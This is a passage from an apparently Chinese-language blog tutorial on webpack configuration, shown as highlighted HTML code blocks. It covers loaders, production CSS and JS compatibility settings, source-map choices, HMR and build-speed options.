详细loader配置，不同文件必须配置不同loader处理</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 匹配哪些文件</span></span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        <span class="comment">// 使用哪些loader进行处理</span></span><br><span class="line">        use: [</span><br><span class="line">          <span class="comment">// 创建style标签，将js中的样式资源插入，添加到head中生效</span></span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          <span class="comment">// 将css文件变成commonjs模块加载js中，里面内容是样式字符串</span></span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">          <span class="comment">// 将less文件编译成css文件</span></span><br><span class="line">          <span class="string">&#x27;less-loader&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 问题：默认处理不了html中img图片</span></span><br><span class="line">        <span class="comment">// 处理图片资源</span></span><br><span class="line">        test: <span class="regexp">/\.(jpg|png|gif)$/</span>,</span><br><span class="line">        loader: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          <span class="comment">// 图片大小小于8kb，就会被base64处理</span></span><br><span class="line">          limit: <span class="number">8</span> * <span class="number">1024</span>,</span><br><span class="line">          esModule: <span class="literal">false</span>,</span><br><span class="line">          <span class="comment">// 给图片进行重命名</span></span><br><span class="line">          name: <span class="string">&#x27;[hash:10].[ext]&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.html$/</span>,</span><br><span class="line">        <span class="comment">// 处理html文件的img图片（负责引入img，从而能被url-loader处理）</span></span><br><span class="line">        loader: <span class="string">&#x27;html-loader&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 排除css/js/html资源</span></span><br><span class="line">        exclude: <span class="regexp">/\.(css|js|less|jpg|png|gif|html)$/</span>,</span><br><span class="line">        loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          name: <span class="string">&#x27;[hash:10].[ext]&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// plugins配置</span></span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="comment">// 详细plugins配置</span></span><br><span class="line">    <span class="comment">// 默认会创建一个空的html，引入打包输出的所有资源（JS/CSS）</span></span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      <span class="comment">// 复制 &#x27;./src/index.html&#x27; 文件，并自动引入打包输出的所有资源（JS/CSS）</span></span><br><span class="line">      template: <span class="string">&#x27;./src/index.html&#x27;</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 模式</span></span><br><span class="line">  mode: <span class="string">&#x27;development&#x27;</span>, <span class="comment">// 开发模式</span></span><br><span class="line">  <span class="comment">// mode: &#x27;production&#x27;, // 生产模式</span></span><br><span class="line">  devServer: &#123;</span><br><span class="line">    <span class="comment">// 项目构建后路径</span></span><br><span class="line">    contentBase: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">    <span class="comment">// 启动gzip压缩</span></span><br><span class="line">    compress: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 端口号</span></span><br><span class="line">    port: <span class="number">3000</span>,</span><br><span class="line">    <span class="comment">// 自动打开浏览器</span></span><br><span class="line">    open: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Webpack-生产环境的基本配置"><a href="#Webpack-生产环境的基本配置" class="headerlink" title="Webpack 生产环境的基本配置"></a>Webpack 生产环境的基本配置</h2><p><a href="https://github.com/topics/javascript">https://github.com/topics/javascript</a></p><ul><li>安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npm i mini-css-extract-plugin -D</span><br><span class="line">npm i postcss-loader@3 postcss-preset-env -D</span><br><span class="line">npm i optimize-css-assets-webpack-plugin -D</span><br><span class="line">npm i eslint eslint-loader eslint-plugin-import eslint-config-airbnb-base -D</span><br><span class="line">npm i babel-loader @babel/core @babel/preset-env -D</span><br><span class="line">npm i @babel/polyfill -D</span><br><span class="line">npm i core-js -D</span><br><span class="line">npm i rimraf -D</span><br></pre></td></tr></table></figure><ul><li><p>压缩一般使用 plugin 完成</p><p>兼容一般使用 loader 完成</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> MiniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">&#x27;mini-css-extract-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> OptimizeCssAssetsWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;optimize-css-assets-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义nodejs环境变量，决定使用browserslist的哪个环境</span></span><br><span class="line">process.env.NODE_ENV = <span class="string">&#x27;production&#x27;</span></span><br><span class="line"><span class="keyword">const</span> commonCssLoader = [</span><br><span class="line">  <span class="comment">// 这个loader取代style-loader。作用：提取js中的css成单独文件</span></span><br><span class="line">  MiniCssExtractPlugin.loader,</span><br><span class="line">  <span class="comment">// 将css文件整合到js文件中</span></span><br><span class="line">  <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">  <span class="comment">// 帮助postcss找到package.json中browserslist里面的配置，通过配置价值指定的css兼容性样式</span></span><br><span class="line">  &#123;</span><br><span class="line">    loader: <span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      ident: <span class="string">&#x27;postcss&#x27;</span>,</span><br><span class="line">      plugins: <span class="function">() =&gt;</span> [<span class="built_in">require</span>(<span class="string">&#x27;postcss-preset-env&#x27;</span>)()],</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: <span class="string">&#x27;./src/js/index.js&#x27;</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">&#x27;js/built.js&#x27;</span>,</span><br><span class="line">    path: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [...commonCssLoader],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        use: [...commonCssLoader, <span class="string">&#x27;less-loader&#x27;</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 语法检查。注意：只检查自己写的源代码</span></span><br><span class="line">      <span class="comment">/* &#123;</span></span><br><span class="line"><span class="comment">        test: /\.js$/,</span></span><br><span class="line"><span class="comment">        exclude: /node_modules/,</span></span><br><span class="line"><span class="comment">        loader: &#x27;eslint-loader&#x27;,</span></span><br><span class="line"><span class="comment">        options: &#123;</span></span><br><span class="line"><span class="comment">          // 优先执行</span></span><br><span class="line"><span class="comment">          enforce: &#x27;pre&#x27;,</span></span><br><span class="line"><span class="comment">          // 自动修复eslint错误</span></span><br><span class="line"><span class="comment">          fix: true,</span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">      &#125;, */</span></span><br><span class="line">      <span class="comment">// 基本js兼容性处理 -&gt; @babel/preset-env</span></span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">        loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          <span class="comment">// 预设：指示babel做怎么样的兼容性处理</span></span><br><span class="line">          presets: [</span><br><span class="line">            [</span><br><span class="line">              <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">// 按需加载</span></span><br><span class="line">                useBuiltIns: <span class="string">&#x27;usage&#x27;</span>,</span><br><span class="line">                <span class="comment">// 指定core-js版本</span></span><br><span class="line">                corejs: &#123;</span><br><span class="line">                  version: <span class="number">3</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">// 指定兼容性做到哪个版本浏览器</span></span><br><span class="line">                targets: &#123;</span><br><span class="line">                  chrome: <span class="string">&#x27;60&#x27;</span>,</span><br><span class="line">                  ie: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">                  safari: <span class="string">&#x27;10&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">              &#125;,</span><br><span class="line">            ],</span><br><span class="line">          ],</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: <span class="string">&#x27;./src/index.html&#x27;</span>,</span><br><span class="line">      minify: &#123;</span><br><span class="line">        <span class="comment">// 移除空格</span></span><br><span class="line">        collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 移除注释</span></span><br><span class="line">        removeComments: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">      <span class="comment">// 对输出的css文件进行重命名</span></span><br><span class="line">      filename: <span class="string">&#x27;css/built.css&#x27;</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="comment">// 压缩css</span></span><br><span class="line">    <span class="keyword">new</span> OptimizeCssAssetsWebpackPlugin(),</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 生产模式js自动压缩</span></span><br><span class="line">  mode: <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="css-兼容性处理"><a href="#css-兼容性处理" class="headerlink" title="css 兼容性处理"></a>css 兼容性处理</h3><p><code>package.json</code> 中的 <code>browserslist</code> 配置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;browserslist&quot;: &#123;</span><br><span class="line">  &quot;development&quot;: [</span><br><span class="line">    &quot;last 1 chrome version&quot;,</span><br><span class="line">    &quot;last 1 firefox version&quot;,</span><br><span class="line">    <span class="string">&quot;last 1 safari version&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  &quot;production&quot;: [</span><br><span class="line">    &quot;&gt;0.2%&quot;,</span><br><span class="line">    &quot;not dead&quot;,</span><br><span class="line">    <span class="string">&quot;not op_mini all&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MiniCssExtractPlugin</code> 提取js中的css成单独文件</p><p><code>OptimizeCssAssetsWebpackPlugin</code> 对 css 代码进行压缩</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    MiniCssExtractPlugin.loader,</span><br><span class="line">    <span class="comment">// 帮助postcss找到package.json中browserslist里面的配置，通过配置价值指定的css兼容性样式</span></span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">&#x27;postcss-loader&#x27;</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        ident: <span class="string">&#x27;postcss&#x27;</span>,</span><br><span class="line">        plugins: <span class="function">() =&gt;</span> [</span><br><span class="line">          <span class="built_in">require</span>(<span class="string">&#x27;postcss-preset-env&#x27;</span>)(),</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">    <span class="comment">// 对输出的css文件进行重命名</span></span><br><span class="line">    filename: <span class="string">&#x27;css/built.css&#x27;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="comment">// 压缩css</span></span><br><span class="line">  <span class="keyword">new</span> OptimizeCssAssetsWebpackPlugin(),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h3 id="eslint-语法检查"><a href="#eslint-语法检查" class="headerlink" title="eslint 语法检查"></a>eslint 语法检查</h3><p><code>package.json</code> 中的 <code>eslintConfig</code> 配置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;eslintConfig&quot;: &#123;</span><br><span class="line">  &quot;extends&quot;: &quot;airbnb-base&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>eslint-loader</code> 自动修复</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">  loader: <span class="string">&#x27;eslint-loader&#x27;</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    <span class="comment">// 自动修复eslint错误</span></span><br><span class="line">    fix: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="js-兼容性处理"><a href="#js-兼容性处理" class="headerlink" title="js 兼容性处理"></a>js 兼容性处理</h3><p>首先需要安装 <code>babel-loader</code> 、 <code>@babel/core</code></p><ol><li><p>基本 js 兼容处理 -&gt; <code>@babel/preset-env</code></p><p>问题：只能转换基本语法，比如：promise 不能转换</p></li><li><p>全部 js 兼容性处理 -&gt; <code>@babel/polyfill</code></p><p>在 js 中引入<code>import &#39;@babel/polyfill&#39;</code></p><p>问题：只要解决部分兼容性问题，但是所有兼容性代码全部引入，体积太大</p></li><li><p>按需加载 js 兼容性处理</p><p>使用 <code>core-js</code></p><p>或使用 link 引入<code>https://polyfill.io/v3/url-builder/</code></p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">  loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    <span class="comment">// 预设：指示babel做怎么样的兼容性处理</span></span><br><span class="line">    presets: [</span><br><span class="line">      [</span><br><span class="line">        <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 按需加载</span></span><br><span class="line">          useBuiltIns: <span class="string">&#x27;usage&#x27;</span>,</span><br><span class="line">          <span class="comment">// 指定core-js版本</span></span><br><span class="line">          corejs: &#123;</span><br><span class="line">            version: <span class="number">3</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="comment">// 指定兼容性做到哪个版本浏览器</span></span><br><span class="line">          targets: &#123;</span><br><span class="line">            chrome: <span class="string">&#x27;60&#x27;</span>,</span><br><span class="line">            firefox: <span class="string">&#x27;60&#x27;</span>,</span><br><span class="line">            ie: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">            safari: <span class="string">&#x27;10&#x27;</span>,</span><br><span class="line">            edge: <span class="string">&#x27;17&#x27;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="html-压缩"><a href="#html-压缩" class="headerlink" title="html 压缩"></a>html 压缩</h3><p>生产环境会自动压缩 js 代码（默认加载 <code>UglifyJsPlugin</code>）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: <span class="string">&#x27;./src/index.html&#x27;</span>,</span><br><span class="line">    minify: &#123;</span><br><span class="line">      <span class="comment">// 移除空格</span></span><br><span class="line">      collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">      <span class="comment">// 移除注释</span></span><br><span class="line">      removeComments: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">    filename: <span class="string">&#x27;css/built.css&#x27;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="keyword">new</span> OptimizeCssAssetsWebpackPlugin(),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h2 id="Webpack-优化配置"><a href="#Webpack-优化配置" class="headerlink" title="Webpack 优化配置"></a>Webpack 优化配置</h2><h3 id="开发环境性能优化"><a href="#开发环境性能优化" class="headerlink" title="开发环境性能优化"></a>开发环境性能优化</h3><h4 id="HMR：（优化打包构建速度）"><a href="#HMR：（优化打包构建速度）" class="headerlink" title="HMR：（优化打包构建速度）"></a>HMR：（优化打包构建速度）</h4><p>HMR（hot module replacement）热模块替换 / 模块热替换</p><p>作用：一个模块发生变化，只会重新打包这一个模块（而不是所有模块）。极大提高构建速度</p><ol><li><p>样式文件，可以使用 HMR 功能，因为 <code>style-loader</code> 内部实现了（比如引入 <code>style-loader</code>）</p></li><li><p>js 文件，默认不能使用 HMR 功能 -&gt;  需要修改 js 代码，添加支持 HMR 功能代码</p><p>注意：HMR 功能对 js 处理，只能处理非入口 js 文件的其他文件</p></li><li><p>html 文件，默认不能使用 HMR 功能，同时导致问题：html 文件不能热更新（不用做 HMR 功能）</p><p>解决方法：修改 entry 入口，将 html 文件引入</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">  <span class="comment">// 开启HMR功能</span></span><br><span class="line">  hot: <span class="literal">true</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="source-map：（优化代码调试）"><a href="#source-map：（优化代码调试）" class="headerlink" title="source-map：（优化代码调试）"></a>source-map：（优化代码调试）</h4><p>一种提供 <strong>源代码到构建后代码的映射</strong> 的技术（如果构建后代码出错了，通过映射可以追溯源代码错误）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [inline-|hidden-|eval-][nosources-][cheap-[module-]]source-map</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 外部。提示的是错误代码准确信息和源代码的错误位置</span></span><br><span class="line">devtool: <span class="string">&#x27;source-map&#x27;</span></span><br><span class="line"><span class="comment">// 内联：只生成一个内联source-map。提示的是错误代码准确信息和源代码的错误位置</span></span><br><span class="line">devtool: <span class="string">&#x27;inline-source-map&#x27;</span></span><br><span class="line"><span class="comment">// 外部。提示的是错误代码准确信息但是没有错误位置（不能追踪源代码错误，只能提示到构建后代码的错误位置）</span></span><br><span class="line">devtool: <span class="string">&#x27;hidden-source-map&#x27;</span></span><br><span class="line"><span class="comment">// 内联：每一个文件都生成对应的source-map，都在eval。提示的是错误代码准确信息和源代码的错误位置</span></span><br><span class="line">devtool: <span class="string">&#x27;eval-source-map&#x27;</span></span><br><span class="line"><span class="comment">// 外部。提示的是错误代码准确信息但是没有任何源代码信息</span></span><br><span class="line">devtool: <span class="string">&#x27;nosources-source-map&#x27;</span></span><br><span class="line"><span class="comment">// 外部。提示的是错误代码准确信息和源代码的错误位置（只能精确到行，其余能精确到准确位置）</span></span><br><span class="line">devtool: <span class="string">&#x27;cheap-source-map&#x27;</span></span><br><span class="line"><span class="comment">// 外部。提示的是错误代码准确信息和源代码的错误位置。module会将loader的source-map加入</span></span><br><span class="line">devtool: <span class="string">&#x27;cheap-module-source-map&#x27;</span></span><br></pre></td></tr></table></figure><p>内联和外部的区别：</p><ol><li>外部生成了文件，内联没有</li><li>内联构建速度更快</li></ol><p>开发环境：速度快，调试更友好</p><ul><li><p>速度快（eval&gt;inline&gt;cheap&gt;…）</p><p>eval-cheap-source-map</p><p>eval-source-map</p></li><li><p>调试更友好</p><p>source-map</p><p>cheap-module-source-map</p><p>cheap-source-map</p></li><li><p><strong>推荐：eval-source-map（脚手架默认使用这个；完整度高，内联速度快）、eval-cheap-module-source-map（错误提示忽略列但是包含其他信息，内联速度快）</strong></p></li></ul><p>生产环境：源代码要不要隐藏？调试要不要更友好</p><ul><li><p>内联会让代码体积大，所以生产环境不用内联</p><p>nosources-source-map 全部隐藏</p><p>hidden-source-map 只隐藏源代码</p><p>source-map</p></li><li><p><strong>推荐：source-map（最完整）、cheap-module-source-map（错误提示一整行忽略列）</strong></p></li></ul><h3 id="生产环境性能优化"><a href="#生产环境性能优化" class="headerlink" title="生产环境性能优化"></a>生产环境性能优化</h3><h4 id="oneOf：惰性匹配（优化打包构建速度）"><a href="#oneOf：惰性匹配（优化打包构建速度）" class="headerlink" title="oneOf：惰性匹配（优化打包构建速度）"></a>oneOf：惰性匹配（优化打包构建速度）</h4><p>匹配到 loader 后就不会再向后进行匹配，提升性能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rules: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 注意：不能有两个配置处理同一个文件</span></span><br><span class="line">    oneOf: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        use: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>, <span class="string">&#x27;less-loader&#x27;</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h4 id="多线程打包：（优化打包构建速度）"><a href="#多线程打包：（优化打包构建速度）" class="headerlink" title="多线程打包：（优化打包构建速度）"></a>多线程打包：（优化打包构建速度）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i thread-loader -D</span><br></pre></td></tr></table></figure><p>某个任务消耗时间较长会卡顿，多线程可以同一时间干多件事，效率更高。</p><ul><li>优点：提升打包速度</li><li>缺点：每个进程的开启和交流都会有开销</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">  use: 